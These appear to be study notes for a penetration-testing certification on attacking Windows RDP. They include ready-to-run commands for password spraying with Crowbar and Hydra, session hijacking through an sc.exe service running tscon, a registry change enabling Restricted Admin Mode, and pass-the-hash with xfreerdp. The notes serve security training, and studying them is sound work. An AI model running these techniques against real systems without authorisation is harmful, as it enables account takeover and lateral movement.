# 🖥️ 1. Attacking RDP

> [!info]  
> **Remote Desktop Protocol (RDP)** is a Microsoft proprietary protocol that provides a graphical interface for remotely connecting to Windows systems.
> 
> RDP is widely used by:
> 
> - 👨‍💻 System administrators
>     
> - 🏢 Managed Service Providers (MSPs)
>     
> - 🖥️ Remote administration environments
>     
> 
> From a penetration-testing perspective, RDP is important because it provides a **direct interactive GUI path into a Windows machine**.
> 
> **Default port:** `TCP/3389`

---

# 🔎 2. RDP Enumeration

## 🌐 Default Port

```text
RDP → TCP/3389
```

Basic Nmap enumeration:

```bash
nmap -Pn -p3389 192.168.2.143
```

Example:

```text
Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server
```

### 🧠 Enumeration Mental Model

```text
🔎 Scan
  │
  ▼
3389/TCP open?
  │
  ▼
🖥️ RDP identified
  │
  ├──► Enumerate authentication
  ├──► Check credentials
  ├──► Password spraying
  ├──► Connect with valid credentials
  └──► If hash available → consider PtH
```

---

# ⚠️ 3. RDP Misconfigurations

RDP requires credentials for authentication, making **password attacks** a common attack vector.

Potential misconfigurations can also result in:

- Accounts without passwords
    
- Weak authentication
    
- Improperly configured access controls
    

> [!warning]  
> Before performing password attacks against Windows accounts, understand the target's **password/account lockout policy**.
> 
> Repeated failed authentication attempts can lock or disable an account.

---

# 🎯 4. Password Spraying vs Brute Force

When account lockout is a concern, **password spraying** can be preferable to repeatedly attacking one account.

### 🔨 Brute Force

```text
User A
 ├── password1
 ├── password2
 ├── password3
 ├── password4
 └── ...
```

Many guesses against one account can trigger account lockout.

### 🌧️ Password Spraying

```text
Password #1
   │
   ├── User A
   ├── User B
   ├── User C
   ├── User D
   └── User E
          │
          ▼
       Password #2
          │
          ├── User A
          ├── User B
          └── ...
```

The goal is to reduce the number of failed attempts against any single account.

> [!important]  
> **Password spraying = one/few passwords → many accounts.**
> 
> **Brute force = many passwords → one account.**

---

# 🪣 5. RDP Password Spraying with Crowbar

Example username list:

```text
root
test
user
guest
admin
administrator
```

Save it as:

```text
usernames.txt
```

Then spray the password `password123`:

```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

Example successful result:

```text
2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

### Result

```text
Username: administrator
Password: password123
Service: RDP
```

---

# 🐉 6. RDP Password Spraying with Hydra

Hydra can also perform RDP password spraying:

```bash
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

Example:

```text
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
```

### Important Hydra Considerations

RDP servers may not tolerate many simultaneous connections.

The source specifically recommends reducing parallelism:

```text
-t 1
```

or:

```text
-t 4
```

and potentially using:

```text
-W 1
```

or:

```text
-W 3
```

to introduce delays between attempts.

> [!warning]  
> Hydra's RDP module is described by the source as **experimental**. Treat connection failures carefully; a failed attempt does not automatically prove the credentials are invalid.

---

# 🖥️ 7. RDP Login with Valid Credentials

Once valid credentials are obtained, we can establish an interactive graphical session.

Two clients highlighted here are:

- `rdesktop`
    
- `xfreerdp`
    

## `rdesktop`

```bash
rdesktop -u admin -p password123 192.168.2.143
```

A self-signed or otherwise untrusted certificate may generate a warning.

Example:

```text
ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

1. Certificate issuer is not trusted by this system.
Issuer: CN=WIN-Q8F2KTAI43A

Do you trust this certificate (yes/no)? yes
```

> [!info]  
> In a lab, you may encounter self-signed RDP certificates. The important point is to understand that the certificate warning is separate from the authentication process.

---

# 🧠 8. Why RDP Access Is Valuable

RDP provides **GUI access**, which can be important when:

- A tool/application is only available through a graphical interface.
    
- You need to interact with Windows GUI applications.
    
- Command-line access is insufficient for the assessment objective.
    
- You have an account that is authorized to log in through RDP.
    

```text
Valid Credentials
       │
       ▼
    RDP :3389
       │
       ▼
Windows GUI Session
       │
       ├──► Applications
       ├──► Files
       ├──► Credentials
       ├──► Network access
       └──► Further enumeration
```

---

# 👤 9. RDP Session Hijacking

RDP becomes particularly interesting after gaining **local administrator/SYSTEM-level access** to a Windows machine.

If another user is currently connected through RDP, it may be possible in some Windows versions/configurations to hijack that user's existing session.

### Scenario

```text
Compromised Windows Host
        │
        ├──► juurena
        │      Administrator
        │
        └──► lewen
               RDP session
               │
               ▼
          Target Session
```

The goal is to access the existing `lewen` session without knowing `lewen`'s password.

---

# 🔑 10. Requirements for RDP Session Hijacking

The source identifies two critical requirements:

1. **SYSTEM privileges**
    
2. The Windows `tscon.exe` utility
    

`tscon.exe` allows a user/session to connect to another desktop session.

> [!important]  
> **Being a local administrator is not itself the final requirement for the hijack.**
> 
> You need to obtain **SYSTEM-level privileges** first.

---

# 🔎 11. Identify RDP Sessions

Use:

```cmd
query user
```

Example:

```text
USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
```

Important information:

```text
juurena
Session ID = 1
Current session = rdp-tcp#13

lewen
Session ID = 2
Target session = rdp-tcp#14
```

---

# 🔄 12. `tscon.exe` Session Hijacking

The basic syntax is:

```cmd
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

In the example:

```text
Target Session ID = 2
Our Session Name = rdp-tcp#13
```

Therefore the conceptual command is:

```cmd
tscon 2 /dest:rdp-tcp#13
```

This connects the target session to the current RDP session.

---

# ⚙️ 13. Obtaining SYSTEM with a Windows Service

If we have local administrator privileges, the source demonstrates creating a Windows service.

Windows services normally run under **Local System** unless configured otherwise.

The service can therefore be used to execute:

```text
tscon
```

under SYSTEM.

Create the service:

```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

Example:

```text
[SC] CreateService SUCCESS
```

Then start it:

```cmd
net start sessionhijack
```

### Attack chain

```text
Local Administrator
       │
       ▼
Create Windows Service
       │
       ▼
Service executes as Local System
       │
       ▼
tscon
       │
       ▼
Target RDP Session
       │
       ▼
Impersonate logged-in user
```

---

# ⚠️ 14. RDP Session Hijacking Version Limitation

> [!warning]  
> The source explicitly notes:
> 
> **This method no longer works on Windows Server 2019.**
> 
> Therefore, do not assume that a successful technique on an older Windows Server version will work identically on newer versions.

---

# 🧠 15. Why Session Hijacking Can Be Powerful

Suppose the hijacked account has additional privileges:

```text
Hijacked User
     │
     ├──► Help Desk group
     │        │
     │        └──► Local admin on many hosts
     │
     ├──► Domain privileges
     │
     └──► Domain Admin
```

The value of session hijacking is therefore not necessarily the local account itself.

The real value is:

> **What additional privileges and network access does that user's identity provide?**

---

# 🔐 16. RDP Pass-the-Hash (PtH)

Another important RDP technique is **Pass-the-Hash**.

Normally:

```text
Username + Password
       │
       ▼
      RDP
       │
       ▼
    GUI Access
```

With PtH:

```text
Username + NT Hash
       │
       ▼
    xfreerdp
       │
       ▼
      RDP
       │
       ▼
    GUI Access
```

This is useful when we have an **NT hash** but cannot recover the plaintext password.

---

# 🧬 17. Where the NT Hash May Come From

The source specifically mentions credential dumping such as the **SAM database**.

Example attack chain:

```text
Credential Dumping
       │
       ▼
   NT Hash obtained
       │
       ├──► Password cannot be cracked
       │
       ▼
   Check RDP access
       │
       ▼
   Attempt RDP PtH
       │
       ▼
      GUI
```

> [!important]  
> **You do not need the plaintext password if the target's RDP configuration supports NT-hash authentication through Restricted Admin Mode and the account is permitted to use RDP.**

---

# ⚠️ 18. RDP PtH Caveat — Restricted Admin Mode

RDP Pass-the-Hash has an important prerequisite.

**Restricted Admin Mode** must be enabled on the target host.

The source notes that it is **disabled by default**.

Without it, the PtH attempt may fail with an account-restriction error.

### Conceptual flow

```text
NT Hash
  │
  ▼
xfreerdp /pth
  │
  ▼
Is Restricted Admin Mode available?
  │
  ├── ❌ No → PtH fails
  │
  └── ✅ Yes
        │
        ▼
      RDP
        │
        ▼
    GUI session
```

---

# 🛠️ 19. Enable Restricted Admin Mode

The source demonstrates enabling it through:

```text
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
```

Create/set:

```text
DisableRestrictedAdmin
```

as a `REG_DWORD` with value `0`.

Command:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Important interpretation

```text
DisableRestrictedAdmin = 0
        │
        ▼
Restricted Admin Mode enabled
```

> [!warning]  
> Changing this registry setting requires appropriate privileges and changes the security configuration of the target system.

---

# 🖥️ 20. RDP PtH with `xfreerdp`

Once the target configuration supports it, use:

```bash
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

Important options:

```text
/v:<target>
    ↓
RDP target

/u:<username>
    ↓
Account

/pth:<NT_HASH>
    ↓
Pass the NT hash instead of plaintext password
```

If successful, you obtain an RDP session as the target user without knowing their cleartext password.

Example identity:

```text
superstore\lewen
```

---

# 🧠 21. RDP PtH Decision Logic

```text
Have NT Hash?
      │
      ├── ❌ No
      │     └──► Need credentials / another access method
      │
      └── ✅ Yes
            │
            ▼
      Does user have RDP rights?
            │
            ├── ❌ No → PtH won't solve authorization
            │
            └── ✅ Yes
                  │
                  ▼
      Is Restricted Admin Mode supported/enabled?
                  │
                  ├── ❌ No → PtH may fail
                  │
                  └── ✅ Yes
                        │
                        ▼
                xfreerdp /pth
                        │
                        ▼
                  🖥️ GUI Access
```

---

# 🧭 22. Complete RDP Attack Methodology

```text
                    🖥️ RDP FOUND
                         │
                         ▼
                   TCP/3389
                         │
                         ▼
                    🔎 ENUMERATE
                         │
                         ▼
                 🔐 Authentication
                         │
              ┌──────────┼──────────┐
              ▼          ▼          ▼
        Credentials   Password    NT Hash
              │       Spraying        │
              │          │            │
              └──────────┼────────────┘
                         ▼
                    🖥️ RDP LOGIN
                         │
                         ▼
                  Interactive GUI
                         │
             ┌───────────┼────────────┐
             ▼           ▼            ▼
          Enumerate   Applications   Users
             │
             ▼
       🔑 Further Credentials
             │
             ▼
       🌐 Lateral Movement


     IF LOCAL ADMIN / SYSTEM:
             │
             ▼
      👤 Check RDP Sessions
             │
             ▼
        query user
             │
             ▼
       Another user logged in?
             │
             ├──► YES
             │      │
             │      ▼
             │   SYSTEM?
             │      │
             │      ▼
             │   tscon/session hijack
             │      │
             │      ▼
             │   Target identity
             │
             └──► NO


     IF ONLY NT HASH:
             │
             ▼
      User has RDP rights?
             │
             ▼
      Restricted Admin Mode?
             │
             ▼
       xfreerdp /pth
             │
             ▼
          🖥️ GUI
```

---

# 🎯 23. When to Use Each RDP Technique

|Situation|Tool / Technique|Purpose|
|---|---|---|
|Need to identify RDP|`nmap -Pn -p3389`|Discover TCP/3389|
|Have usernames + candidate password|Crowbar|RDP password spraying|
|Have usernames + candidate password|Hydra|RDP password spraying|
|Valid plaintext credentials|`rdesktop`|Interactive RDP|
|Valid plaintext credentials|`xfreerdp`|Interactive RDP|
|Local admin on compromised host|`query user`|Find active sessions|
|SYSTEM + another RDP session|`tscon.exe`|Session hijacking|
|Need SYSTEM for session hijacking|Windows service / `sc.exe`|Execute as Local System|
|Have NT hash instead of password|`xfreerdp /pth`|RDP Pass-the-Hash|
|RDP PtH failing|Check Restricted Admin Mode|Determine whether PtH is supported|
|Need to enable Restricted Admin Mode|Registry `DisableRestrictedAdmin=0`|Enable required configuration|
|Hijacked account has greater privileges|Existing RDP session|Impersonate higher-value identity|

---

# ⚡ 24. RDP Cheat Sheet

## 🔎 Identify RDP

```bash
nmap -Pn -p3389 <TARGET>
```

```text
TCP/3389 → RDP
```

## 🌧️ Password Spray

### Crowbar

```bash
crowbar -b rdp -s <TARGET>/32 -U users.txt -c '<PASSWORD>'
```

### Hydra

```bash
hydra -L usernames.txt -p '<PASSWORD>' <TARGET> rdp
```

For RDP, reduce concurrency if necessary:

```text
-t 1
-t 4
```

and potentially delay:

```text
-W 1
-W 3
```

## 🖥️ RDP Login

```bash
rdesktop -u <USER> -p '<PASSWORD>' <TARGET>
```

or:

```bash
xfreerdp /v:<TARGET> /u:<USER> /p:'<PASSWORD>'
```

## 👤 Check Sessions

```cmd
query user
```

## 🔄 Session Hijacking

```cmd
tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>
```

If SYSTEM is required, the source demonstrates:

```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <ID> /dest:<OUR_SESSION>"
```

Then:

```cmd
net start sessionhijack
```

> [!warning]  
> The source notes this session-hijacking method no longer works on **Server 2019**.

## 🔐 RDP Pass-the-Hash

Enable Restricted Admin Mode when appropriate:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Then:

```bash
xfreerdp /v:<TARGET> /u:<USER> /pth:<NT_HASH>
```

---

# 🧠 25. CPTS Mental Model

> [!important]  
> When you see **RDP**, don't immediately think only about "password guessing."
> 
> Think in layers:

```text
🖥️ RDP :3389
      │
      ▼
   🔎 ENUMERATION
      │
      ▼
   🔐 AUTHENTICATION
      │
      ├──► Plaintext credentials
      │        │
      │        └──► RDP GUI
      │
      ├──► Username list + password
      │        │
      │        └──► Password Spray
      │
      └──► NT Hash
               │
               └──► RDP PtH
                        │
                        ▼
                    GUI Access


After local compromise:
      │
      ▼
   👑 Admin / SYSTEM
      │
      ▼
   query user
      │
      ▼
 Another RDP user logged in?
      │
      ▼
   tscon/session hijacking
      │
      ▼
   Higher-value identity
```

---

# 🏆 26. Key Takeaways

> [!success]
> 
> - 🖥️ **RDP uses TCP/3389 by default.**
>     
> - 🔎 Use `nmap -Pn -p3389` to identify the service.
>     
> - 🔐 RDP commonly becomes an attack target when valid credentials are unknown.
>     
> - 🌧️ **Password spraying** is useful when Windows account lockout is a concern: try one password across many users rather than many passwords against one user.
>     
> - 🪣 **Crowbar** and **Hydra** can perform RDP password spraying.
>     
> - 🖥️ `rdesktop` and `xfreerdp` can provide interactive GUI access with valid credentials.
>     
> - 👤 `query user` identifies active Windows sessions.
>     
> - 🔄 RDP session hijacking can potentially allow a SYSTEM-level attacker to take over another active user's session on affected Windows versions/configurations.
>     
> - ⚙️ The demonstrated session-hijacking technique uses `sc.exe` to create a Local System service that executes `tscon`.
>     
> - ⚠️ The source specifically states that this hijacking method **does not work on Server 2019**.
>     
> - 🔑 **RDP Pass-the-Hash** can provide GUI access when you have an NT hash instead of the plaintext password, provided the target configuration supports it.
>     
> - 🛡️ Restricted Admin Mode is a key requirement for the demonstrated RDP PtH technique.
>     
> - 🧠 The most important question after obtaining RDP access is: **"What does this user's identity give me?"**
>     
> 
> **CPTS mental model:**
> 
> ```text
> RDP FOUND
>    ↓
> 3389
>    ↓
> AUTHENTICATION
>    ↓
> ┌───────────────┬────────────────┐
> │               │                │
> ▼               ▼                ▼
> Password       Credentials      NT Hash
> Spray          → RDP            → PtH
> │               │                │
> └───────────────┴────────────────┘
>                 ↓
>             GUI ACCESS
>                 ↓
>          ENUMERATE USERS
>                 ↓
>       CHECK PRIVILEGES / SESSIONS
>                 ↓
>          FURTHER ACCESS
> ```